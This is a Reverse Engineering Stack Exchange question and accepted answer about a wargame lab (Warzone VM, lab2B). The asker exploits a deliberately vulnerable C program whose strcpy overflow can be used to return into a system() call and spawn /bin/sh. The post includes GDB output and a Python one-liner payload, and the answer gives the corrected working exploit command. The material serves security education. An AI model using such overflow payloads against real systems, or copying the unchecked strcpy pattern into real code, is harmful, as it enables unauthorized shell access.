{
    "title": "How can I get my shellcode to work outside of GDB?",
    "link": "https://reverseengineering.stackexchange.com/questions/25298/how-can-i-get-my-shellcode-to-work-outside-of-gdb",
    "content": "I'm working inside a Warzone VM with no ALSR or NX bit. The program I'm trying to exploit is really simple:\n<pre><code>#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n\n/*\n * compiled with:\n * gcc -O0 -fno-stack-protector lab2B.c -o lab2B\n */\n\nchar* exec_string = \"/bin/sh\";\n\nvoid shell(char* cmd)\n{\n    system(cmd);\n}\n\nvoid print_name(char* input)\n{\n    char buf[15];\n    strcpy(buf, input);\n    printf(\"Hello %s\n\", buf);\n}\n\nint main(int argc, char** argv)\n{\n    if(argc != 2)\n    {\n        printf(\"usage:\n%s string\n\", argv[0]);\n        return EXIT_FAILURE;\n    }\n\n    print_name(argv[1]);\n\n    return EXIT_SUCCESS;\n}\n</code></pre>\nI was able to get it working in GDB (I think):\n<pre><code>lab2B@warzone:/levels/lab02$ gdb --args lab2B $(python -c \"print 'A' * 27 + '\\xbd\\x86\\x04\\x08' + 'BBBB' + '\\x28\\xa0\\x04\\x08'\")\nReading symbols from lab2B...(no debugging symbols found)...done.\ngdb-peda$ disas shell\nDump of assembler code for function shell:\n   0x080486bd <+0>: push   ebp\n   0x080486be <+1>: mov    ebp,esp\n   0x080486c0 <+3>: sub    esp,0x18\n   0x080486c3 <+6>: mov    eax,DWORD PTR [ebp+0x8]\n   0x080486c6 <+9>: mov    DWORD PTR [esp],eax\n   0x080486c9 <+12>:    call   0x8048590 <system@plt>\n   0x080486ce <+17>:    leave\n   0x080486cf <+18>:    ret\nEnd of assembler dump.\ngdb-peda$ b *0x080486c9\nBreakpoint 1 at 0x80486c9\ngdb-peda$ r\nStarting program: /levels/lab02/lab2B AAAAAAAAAAAAAAAAAAAAAAAAAAA�BBBB\\(�\nHello AAAAAAAAAAAAAAAAAAAAAAAAAAA�BBBB(�\n[----------------------------------registers-----------------------------------]\nEAX: 0x804a028 --> 0x80487d0 (\"/bin/sh\")\nEBX: 0xb7fcd000 --> 0x1a9da8\nECX: 0x0\nEDX: 0xb7fce898 --> 0x0\nESI: 0x0\nEDI: 0x0\nEBP: 0xbffff66c (\"AAAABBBB(\\240\\004\\b\")\nESP: 0xbffff654 --> 0x804a028 --> 0x80487d0 (\"/bin/sh\")\nEIP: 0x80486c9 (<shell+12>: call   0x8048590 <system@plt>)\nEFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x80486c0 <shell+3>: sub    esp,0x18\n   0x80486c3 <shell+6>: mov    eax,DWORD PTR [ebp+0x8]\n   0x80486c6 <shell+9>: mov    DWORD PTR [esp],eax\n=> 0x80486c9 <shell+12>:    call   0x8048590 <system@plt>\n   0x80486ce <shell+17>:    leave\n   0x80486cf <shell+18>:    ret\n   0x80486d0 <print_name>:  push   ebp\n   0x80486d1 <print_name+1>:    mov    ebp,esp\nGuessed arguments:\narg[0]: 0x804a028 --> 0x80487d0 (\"/bin/sh\")\n[------------------------------------stack-------------------------------------]\n0000| 0xbffff654 --> 0x804a028 --> 0x80487d0 (\"/bin/sh\")\n0004| 0xbffff658 ('A' <repeats 24 times>, \"BBBB(\\240\\004\\b\")\n0008| 0xbffff65c ('A' <repeats 20 times>, \"BBBB(\\240\\004\\b\")\n0012| 0xbffff660 ('A' <repeats 16 times>, \"BBBB(\\240\\004\\b\")\n0016| 0xbffff664 ('A' <repeats 12 times>, \"BBBB(\\240\\004\\b\")\n0020| 0xbffff668 (\"AAAAAAAABBBB(\\240\\004\\b\")\n0024| 0xbffff66c (\"AAAABBBB(\\240\\004\\b\")\n0028| 0xbffff670 (\"BBBB(\\240\\004\\b\")\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 1, 0x080486c9 in shell ()\ngdb-peda$ c\nContinuing.\n[New process 2068]\nReading symbols from /usr/lib/debug/lib/i386-linux-gnu/libc-2.19.so...done.\nReading symbols from /usr/lib/debug/lib/i386-linux-gnu/ld-2.19.so...done.\nprocess 2068 is executing new program: /bin/dash\nReading symbols from /usr/lib/debug/lib/i386-linux-gnu/ld-2.19.so...done.\nWarning:\nCannot insert breakpoint 1.\nCannot access memory at address 0x80486c9\n</code></pre>\nBut it seems like the shell won't open outside of GDB:\n<pre><code>lab2B@warzone:/levels/lab02$ ./lab2B $(python -c \"print 'A' * 27 + '\\xbd\\x86\\x04\\x08' + 'BBBB' + '\\x28\\xa0\\x04\\x08'\")\nHello AAAAAAAAAAAAAAAAAAAAAAAAAAA�BBBB(�\nsh: 1: : not found\nSegmentation fault (core dumped)\n</code></pre>\nI would think it's some kind of stack padding issue due to different environments(?) but it does seem to be invoking <pre><code>sh</code></pre> to some capacity. What kind of tools can I use to debug this sort of issue outside of GDB? If tooling won't help is there any kind of reading that will help me better understand what's going on? Thanks!\n",
    "votes": "1",
    "answers": 1,
    "views": "882",
    "tags": [
        "disassembly",
        "gdb",
        "buffer-overflow",
        "shellcode"
    ],
    "user": "smbullet",
    "time": "Jun 15, 2020 at 0:28",
    "comments": [],
    "answers_data": [
        {
            "content": "I don't think your shell code works even in gdb. The problem is in the address of the string in your shellcode. You are not showing in your question how did you get the address of the string that you use (<pre><code>0x804a028</code></pre>) but if you would search for <pre><code>'/bin/sh'</code></pre>, it would probably be at address <pre><code>0x80487d0</code></pre> and that should be in your shellcode. Right now your are passing an address that points to an address of the string. You just need an address of the string. You could verify it by calling <pre><code>shellcode(exec_string)</code></pre> and checking the stack/addressess/pointers just before the call to <pre><code>system</code></pre>.\nSo corrected executions should be:\n<pre><code>./lab2B $(python -c \"print 'A' * 27 + '\\xbd\\x86\\x04\\x08' + 'BBBB' + '\\xd0\\x87\\x04\\x08'\")\n</code></pre>\n",
            "votes": "2",
            "user": "Paweł Łukasik",
            "time": "Jun 15, 2020 at 20:57",
            "is_accepted": true,
            "comments": [
                {
                    "user": "smbullet",
                    "text": "<span class=\"comment-copy\">Ah, you're absolutely right! I was passing the address the pointer was stored at, not the value of the pointer itself. Thanks for the sanity check - definitely something I will watch for in the future. I went to see where this red herring came from: <code>sh: 1: : not found</code> and it looks like <a href=\"https://linux.die.net/man/3/system\" rel=\"nofollow noreferrer\">system(3) always calls <code>/bin/sh -c </code> on it's input</a>.</span>",
                    "time": null
                }
            ]
        }
    ]
}